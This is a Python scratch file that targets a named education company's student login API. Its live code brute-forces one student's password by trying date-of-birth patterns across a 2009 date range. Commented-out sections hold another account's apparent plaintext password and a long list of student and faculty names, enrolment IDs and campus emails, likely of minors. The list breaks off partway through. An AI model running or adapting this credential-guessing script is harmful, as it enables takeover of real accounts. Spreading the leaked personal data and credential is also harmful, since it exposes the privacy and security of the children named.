# # # # from psids import user_details

# # # # fails = ['410242120109', '410242120145', '410242120221', '410242120050', '410242120103', '410242120011', '410242120266', '410242120211', '410242120091', '410242120265', '410242120244', '410242120035', '410242120062', '410242120080', '410242120038', '410242120254']

# # # # if fails:
# # # #     print("\nFails: ", fails)
# # # #     for i in user_details:
# # # #         if i['Enrollment ID'] in fails:
# # # #             print('\t', i['Student Name'], i['Enrollment ID'], i['PSID'])



# # import requests

# # r = requests.post("https://session-service.aakash.ac.in/prod/sess/api/v2/user/session/", json={
# #     "psid_or_mobile":"00014331643",
# #     "password":"An@020509",
# #     "profile":"student"
# # })



import requests
from datetime import datetime, timedelta

url = "https://session-service.aakash.ac.in/prod/sess/api/v2/user/session"  # Replace with the actual login endpoint
username = "00005936714"   # Replace with the actual username
# name = 'Si'
# 00005936714@aakashicampus.com


start_date = datetime(2009, 2, 1)
end_date = datetime(2009, 5, 1)
# start_date = datetime(2009, 1, 1)

delta = timedelta(days=1)
current_date = start_date

while current_date <= end_date:
    dob_password = current_date.strftime("%d%m%y")
    payload = {
        "psid_or_mobile": username,
        "password": f'Si@{dob_password}',
        "profile":"student"
    }
    response = requests.post(url, json=payload)
    if response.status_code != 400:
        print()
    print(f"{dob_password} {response.status_code} {response.text}")
    if response.status_code != 400:
        print()
    # Check for successful login (customize this condition as needed)
    # if "success" in response.text.lower():
    #     print(f"Password found: {dob_password}")
    #     break
    current_date += delta

# # # import requests

# # # false = False
# # # true = True

# # # ppl = [
# # #     {
# # #         "id": "2e041c63-e6e7-4972-be5b-e01d4cc41b81",
# # #         "displayName": "aakarsh ashwin(00008910299)",
# # #         "email": "00008910299@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a88b384d-40ba-483d-8c46-9c06b476ce71",
# # #         "displayName": "Aarush Bharadwaj(00014273691)",
# # #         "email": "00014273691@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "99a35253-56d4-4658-a8da-4b9a3356c4c6",
# # #         "displayName": "AARUSH PRAKASH(00013929897)",
# # #         "email": "00013929897@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "45958538-dea2-4554-b23c-4a6b388fa465",
# # #         "displayName": "Abheek Venkat D (00014703298)",
# # #         "email": "00014703298@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9f7487d9-bfbd-4efc-adba-5f45ef082005",
# # #         "displayName": "Abhinavrao T R(00014240679)",
# # #         "email": "00014240679@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "bdf1558c-124c-4407-8ad6-f63573a8ccf9",
# # #         "displayName": "Adhish A N(00014123861)",
# # #         "email": "00014123861@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7730019c-5ef5-4453-89f0-7db8510806e7",
# # #         "displayName": "Adhvik PJ(00009248868)",
# # #         "email": "00009248868@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "930f09d1-e851-404c-a39a-9e341e70b9a5",
# # #         "displayName": "Aditi Policepatil(00012622831)",
# # #         "email": "00012622831@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e47dfb67-c383-4dad-9782-175dc391d327",
# # #         "displayName": "Aditya K(00015291751)",
# # #         "email": "00015291751@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d15d0a99-9569-4c6b-97e8-10f4bec72bdc",
# # #         "displayName": "Aditya Tippannavar(00014601360)",
# # #         "email": "00014601360@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2ce65b57-db8f-4799-91e2-c4cad2612a51",
# # #         "displayName": "Adweta Sahu(00014570652)",
# # #         "email": "00014570652@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d1c59bc7-bf8d-4e77-9461-54d100191c32",
# # #         "displayName": "Akhil Ramprasad(00014585973)",
# # #         "email": "00014585973@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "acd1b0e7-9bd1-479e-9357-e028e2c44c9e",
# # #         "displayName": "Akruthid Mahadikar(00013963961)",
# # #         "email": "00013963961@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7166f85a-4325-4cde-80f9-dfcc0d6062d7",
# # #         "displayName": "Ananya Gangadhar(00012310266)",
# # #         "email": "00012310266@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "fd8458db-cc4a-4fe3-a641-1675e2ec9e22",
# # #         "displayName": "Ananya Hemantkumar(00010709139)",
# # #         "email": "00010709139@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "411771f4-f381-4663-99a2-43e77f669a9a",
# # #         "displayName": "Ananya Moulik(00014104961)",
# # #         "email": "00014104961@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "acee8d82-da13-454f-a37b-532d795c2d21",
# # #         "displayName": "Anay Krishna (00014654825)",
# # #         "email": "00014654825@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6b299735-928d-4a05-b5ac-e44faeb4afe9",
# # #         "displayName": "Anirudh Annoo(00012561688)",
# # #         "email": "00012561688@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "150f1465-b30a-4611-a8f4-89836c729edc",
# # #         "displayName": "ANIRUDH MISHRA .(00006218659)",
# # #         "email": "00006218659@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3f66fdeb-995d-4024-b376-9f9a8c90cf9f",
# # #         "displayName": "Anurag Babar(00014575657)",
# # #         "email": "00014575657@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "67ab0c88-b88d-4443-91ab-e3475287b59d",
# # #         "displayName": "Anushka Gaonkar(00011589489)",
# # #         "email": "00011589489@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "fe48690c-d490-4278-8ef9-6fe743956bc1",
# # #         "displayName": "ANUSHKA TIWARY(00014542793)",
# # #         "email": "00014542793@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c56fb97b-b9a5-4ffa-b83e-bc61d3e8710e",
# # #         "displayName": "Arsh Mohmed V M(00014718390)",
# # #         "email": "00014718390@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6602e037-4c7e-4c65-940a-0c356d197f71",
# # #         "displayName": "ASHWANTH KUMAR S( 00010082311 )",
# # #         "email": "00010082311@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "55b5c895-4ab7-46e1-9c9c-f778cd9a5dc7",
# # #         "displayName": "Ashwin Karnam(00013842733)",
# # #         "email": "00013842733@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7e7e4ee8-6783-44d8-844e-dc869684cb57",
# # #         "displayName": "Avaneesh Prasanna(00013948052)",
# # #         "email": "00013948052@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "03487f19-4133-412e-a187-14f4674702bd",
# # #         "displayName": "Avaneesh S Kulkarni (00014609630)",
# # #         "email": "00014609630@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ecab8b58-9dd2-49ce-a948-e9f8901f17d7",
# # #         "displayName": "Ayush Sinha(00014591589)",
# # #         "email": "00014591589@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5aede17a-8f8c-416e-83d8-fc69bb59fcc9",
# # #         "displayName": "B Arnav Varma (00013845662)",
# # #         "email": "00013845662@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "67113046-f592-4e67-81be-6dc7e32cd4ef",
# # #         "displayName": "Bhaargavi SS(00012805140)",
# # #         "email": "00012805140@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "4a1a7143-4e37-4e70-8d00-1f859e36f680",
# # #         "displayName": "Bhargav K (00014442842)",
# # #         "email": "00014442842@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "1d01d18d-f581-4856-ac65-a8aae4139e12",
# # #         "displayName": "Bhavana S(00013432444)",
# # #         "email": "00013432444@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c96bd03c-bc24-48de-a18e-e54971abc95b",
# # #         "displayName": "Bhoomika K S(00009684735)",
# # #         "email": "00009684735@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7a7ad837-9a8d-4ce7-ad52-439b16fee746",
# # #         "displayName": "Chaithanya RS(00014597407)",
# # #         "email": "00014597407@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "222ae305-d6be-437d-8687-f8e2d2d759ea",
# # #         "displayName": "Chinmai Rajasekhar (00014191225)",
# # #         "email": "00014191225@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "f7de8eb4-2138-4503-89b0-650602890c17",
# # #         "displayName": "Chinmai V(00014642850)",
# # #         "email": "00014642850@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b5f87ed3-1dc9-4f2e-8c88-6d5714612933",
# # #         "displayName": "CHINMAY M(00008564750)",
# # #         "email": "00008564750@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "232bca89-20ef-4f4a-a5e6-a5fbc30a2fa8",
# # #         "displayName": "Daksh Pramod(00014585638)",
# # #         "email": "00014585638@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "59df927c-b58c-4668-9573-b3d751d5eb76",
# # #         "displayName": "Davin jace MA(00015036864)",
# # #         "email": "00015036864@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3396ba40-e285-4722-9bcb-76919d4c49bb",
# # #         "displayName": "Deeksha C K(00014909117)",
# # #         "email": "00014909117@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "4ea95816-1dc0-4b5e-ae30-d8ebd73cbea0",
# # #         "displayName": "Deepesh R(00012593459)",
# # #         "email": "00012593459@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e4dfc397-e346-4dec-9968-e4684e7dfc60",
# # #         "displayName": "Deetchitha BS(00006479550)",
# # #         "email": "00006479550@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8b484fc1-c29e-414a-835b-4a1aedd182db",
# # #         "displayName": "Devi Hansika Bachu(00014517754)",
# # #         "email": "00014517754@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "0940f355-d9fa-44a9-93ab-91baf542efe9",
# # #         "displayName": "Dharnish A(00015119578)",
# # #         "email": "00015119578@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "813c0793-f6da-429c-a0b7-88d4d0c7dbc5",
# # #         "displayName": "DHARSHINI U(00012562226)",
# # #         "email": "00012562226@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7aed7555-5573-4a92-b2d9-f413b2cca065",
# # #         "displayName": "Dharun Prasath R(00015209248)",
# # #         "email": "00015209248@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "48b5a32e-3b68-47ba-a938-05929665eb3e",
# # #         "displayName": "Dheeraj kumar(00015209223)",
# # #         "email": "00015209223@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "059fa305-7808-44a9-ac13-298bd65d4e64",
# # #         "displayName": "Dhivya Bharathi(00012579444)",
# # #         "email": "00012579444@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d272aa7c-ac17-4e25-823a-ba05d1b7ddd0",
# # #         "displayName": "Dhrupad kumar K.S(00010777824)",
# # #         "email": "00010777824@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "75381ad2-e307-42a7-81af-7ca5f2160e85",
# # #         "displayName": "Dhruva Chowdari(00005292282)",
# # #         "email": "00005292282@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d29932e9-52a7-41b3-aa4d-248097dc56a0",
# # #         "displayName": "DHRUVA HEGDE(00011843533)",
# # #         "email": "00011843533@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b090e629-7515-4b10-8443-0451c71d0442",
# # #         "displayName": "dhyanaganesh thawari(00014616029)",
# # #         "email": "00014616029@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "95487d9e-74b7-451f-b52b-141e8ba1ecad",
# # #         "displayName": "Edp Bannerghatta (BH410)",
# # #         "email": "bh410@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "f036b34e-8265-44ef-886b-ca5eff084620",
# # #         "displayName": "Edp Hosur (656TN)",
# # #         "email": "TN656@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "bfbd83f3-4860-41ef-8327-0add4f98589e",
# # #         "displayName": "Edp Hsrlayout (083BH)",
# # #         "email": "edp.hsrlayout@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "f560a940-dd81-4403-8905-d5e332251ad1",
# # #         "displayName": "Edp Hsrlayout (BH083)",
# # #         "email": "bh083@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6748584c-0da6-4448-ab25-4b90764408d7",
# # #         "displayName": "Edp Inagar (040BI)",
# # #         "email": "edp.inagar@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "eb37bbf2-f217-4a69-b43e-98d1ce166afb",
# # #         "displayName": "Edp Inagar (BI040)",
# # #         "email": "bi040@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6bf59cbb-c298-4f86-a44f-fbf8a3862bc3",
# # #         "displayName": "Edp Jayanagar (BJ042)",
# # #         "email": "bj042@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "47ad55ff-1e09-4c4b-ba11-ece066b6b2b0",
# # #         "displayName": "Edp Whitefield (064WF)",
# # #         "email": "edp.whitefield@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c469ddab-2112-4b59-b811-9da36b069673",
# # #         "displayName": "Edp Whitefield (WF064)",
# # #         "email": "wf064@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "71c92f39-1760-4224-adb3-f215a35e872e",
# # #         "displayName": "GAGAN SAMANTA(00008197333)",
# # #         "email": "00008197333@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8a324483-7e9f-4e28-9730-e5a5c697914a",
# # #         "displayName": "Gagana Ck (00013786131)",
# # #         "email": "00013786131@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "eefe280f-01c7-4910-8d18-effd2ee9be39",
# # #         "displayName": "Garvit Bhatt (FM14148)",
# # #         "email": "garvitbhatt.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e91ee95e-c9ee-4a0e-a528-88d11ce9078a",
# # #         "displayName": "Gayathri .G(00012907135)",
# # #         "email": "00012907135@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9d3bcb5f-fa74-44c4-9016-bd1f3ace6fd7",
# # #         "displayName": "GOKUL RAMESH(00009039409)",
# # #         "email": "00009039409@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6a7b14d3-b4a1-4432-8535-632ebd6f3d0d",
# # #         "displayName": "Hanshika(00014838668)",
# # #         "email": "00014838668@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3dc5a193-88f0-4437-b30c-3c936515b2b4",
# # #         "displayName": "Hari prasad(00007428089)",
# # #         "email": "00007428089@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3a5a348e-8c92-450a-94de-46a9a69008db",
# # #         "displayName": "Hariharan M(00012405740)",
# # #         "email": "00012405740@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "81b48fc8-699e-4e40-aced-e9125801368d",
# # #         "displayName": "Harimukesh P(00012585850)",
# # #         "email": "00012585850@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "64b2d97c-53ff-4b6f-afb7-34ccb416f682",
# # #         "displayName": "Harinisha S (00014373741)",
# # #         "email": "00014373741@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "1856c302-f974-46d3-ad2e-7c1d3131c80b",
# # #         "displayName": "Harish B M (FZ05636)",
# # #         "email": "harishbm.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5ba3a38a-c240-4619-88fd-6dfce5d98272",
# # #         "displayName": "Harsha Jha(00013639474)",
# # #         "email": "00013639474@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d53e29ab-dc45-4db7-9bf2-e4a879e4cc12",
# # #         "displayName": "Harshil Agrawal (00013808090)",
# # #         "email": "00013808090@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "81928f56-685d-4540-aecc-9469c4d917d1",
# # #         "displayName": "Hemaprabha S K(00006007406)",
# # #         "email": "00006007406@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "190888ee-9b54-4564-9553-c8684b08d65b",
# # #         "displayName": "Himani Panda(00011809534)",
# # #         "email": "00011809534@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8f87fc03-69fa-49bb-a99e-dd8ad7952348",
# # #         "displayName": "Indukuri Venkata Dileep Kumar Raju (FM9991)",
# # #         "email": "dileepkumar.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9ba3eca2-8490-4e8f-b2b8-822107a654bf",
# # #         "displayName": "Ishaan N(00014589993)",
# # #         "email": "00014589993@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c88d9db3-8125-4dd1-875e-df2866687a0d",
# # #         "displayName": "Jaigogul E v(00012438221)",
# # #         "email": "00012438221@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "770d20f7-6af2-423f-a12d-36f7339b8965",
# # #         "displayName": "JAISHREE J V(00014755070)",
# # #         "email": "00014755070@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7398e132-96e3-4cf0-9795-1c6f2821fb0d",
# # #         "displayName": "Jeevitha V(00015291829)",
# # #         "email": "00015291829@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b95420b6-ba7c-4312-81bc-1114b7e8818e",
# # #         "displayName": "Josh Kevin J(00007637827)",
# # #         "email": "00007637827@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8ea81b22-79ab-4407-b9a3-9dabf6100dfa",
# # #         "displayName": "K Revanth Reddy (00014421627)",
# # #         "email": "00014421627@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e4323d39-9509-47ec-b4b6-7ea325ed67ad",
# # #         "displayName": "Kamala kannan(00015076813)",
# # #         "email": "00015076813@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "282d7fdd-08a0-4f61-9da3-86bed82155c6",
# # #         "displayName": "Kanishk Mundhra(00012061780)",
# # #         "email": "00012061780@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "07dd1aad-99e7-48eb-a1df-a553bc6f0e6c",
# # #         "displayName": "Kartheesan S N (00014724982)",
# # #         "email": "00014724982@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "eb94918f-097b-4fc1-a891-1d99143532b8",
# # #         "displayName": "Kartiktiwari (00014601572)",
# # #         "email": "00014601572@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "86936d80-48bf-4b2a-9aac-1c199d6fefcf",
# # #         "displayName": "KAUSIK PALANIVEL(00014994605)",
# # #         "email": "00014994605@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c53f5a51-5583-4c52-8a49-b1ead1693d7e",
# # #         "displayName": "Kaustubh Kashyap(00009205880)",
# # #         "email": "00009205880@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "af7960d8-4f53-4867-bc73-b6f292f96b46",
# # #         "displayName": "Keerthana S(00014933253)",
# # #         "email": "00014933253@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d0b8ba7c-e968-4a59-9000-a45c0c294029",
# # #         "displayName": "Keerthivasan P(00010177316)",
# # #         "email": "00010177316@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "22de4e40-b31b-4593-8b07-d6eda6301103",
# # #         "displayName": "Keshav .( 00010209346 )",
# # #         "email": "00010209346@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9fdea946-c830-4bf6-ab38-328f980f4e42",
# # #         "displayName": "Kota Venkata Subba Rao (FM09120)",
# # #         "email": "kotavenkatasubbarao.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6cb75f82-09d3-47c5-85b1-cc9200496f09",
# # #         "displayName": "Laasya Ilavaram (00014331596)",
# # #         "email": "00014331596@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "0097090d-e20d-45bb-88c9-baf0678f7b16",
# # #         "displayName": "LAKSHITHA ASHOK KUMAR(00015093057)",
# # #         "email": "00015093057@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "df9cf708-63d9-4768-bf21-26b972bef641",
# # #         "displayName": "Laukyashree U(00014614238)",
# # #         "email": "00014614238@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b112db3c-b145-488e-8f22-a178d8bcc654",
# # #         "displayName": "Laura Sulkunte(00015300259)",
# # #         "email": "00015300259@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e623d858-9cdf-48a4-b9a8-ae67545a556e",
# # #         "displayName": "Leenashilpashini S (00012591988)",
# # #         "email": "00012591988@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8f6eee1b-c454-460a-b3ca-3343e849f826",
# # #         "displayName": "Lovisha Johri (00014331563)",
# # #         "email": "00014331563@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9de02bfe-2d00-4e9a-a75d-900c0aadab9d",
# # #         "displayName": "Maalavika L(00008573884)",
# # #         "email": "00008573884@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d8493ca2-2d58-4fb1-8110-9c80b749568d",
# # #         "displayName": "Madimi Aashritha (00014438870)",
# # #         "email": "00014438870@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2f6de7e0-ca1b-4993-90ad-f0a7d6d8ab14",
# # #         "displayName": "Mahalakshmi S(00015255949)",
# # #         "email": "00015255949@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3bc30811-1a24-45f3-a50c-c3640638bec2",
# # #         "displayName": "Mahasakthi (00013625081)",
# # #         "email": "00013625081@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "276d095b-054b-49cc-8f09-0ce68dfccfbc",
# # #         "displayName": "Manikandan K S(00013918299)",
# # #         "email": "00013918299@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a1e09273-a629-4356-8683-c2a889c24ebc",
# # #         "displayName": "Manu Neeralagi( 00009448863 )",
# # #         "email": "00009448863@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "09f96654-7ff4-4b25-a7f9-6f7a353c77b8",
# # #         "displayName": "Manyam Srivatsav (00009402136)",
# # #         "email": "00009402136@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "55ba8236-4f88-4db8-aca3-ab3d0789b6cf",
# # #         "displayName": "MARZOOQUAH FATHIMA(00014962697)",
# # #         "email": "00014962697@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "f7adf360-afcd-4238-a5e3-f3f3851717cd",
# # #         "displayName": "Mitra Muthukumar(00012141051)",
# # #         "email": "00012141051@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c94b05d2-9cbe-476d-a1ae-7bd7ee428698",
# # #         "displayName": "Mugilan Vu (00013872888)",
# # #         "email": "00013872888@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8f358235-19b1-496b-adb2-e46fe84c1ac4",
# # #         "displayName": "MuhammedNaumaan Naumaan(00014229750)",
# # #         "email": "00014229750@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c9b0289d-4e2d-44c3-8617-95efe04cdb73",
# # #         "displayName": "Mukilan V( 00010506490 )",
# # #         "email": "00010506490@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "dc9ae15d-6b88-44a5-9f28-a145ce25c06e",
# # #         "displayName": "Muppala Yashwanth Chowdary (FC08240)",
# # #         "email": "muppalayashwanthchowdary.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "605437ec-fa54-4c00-87cd-74c5bcbdd89c",
# # #         "displayName": "NAMIYSH VIGNESHWAR RM(00012602641)",
# # #         "email": "00012602641@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6633a6e0-09e6-4254-a131-d48908cdaaa2",
# # #         "displayName": "ND rupesha(00007406713)",
# # #         "email": "00007406713@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "df080678-86af-44e0-ae78-f1fea7b77073",
# # #         "displayName": "Neha Arora(00014585383)",
# # #         "email": "00014585383@aakashicampus.com",
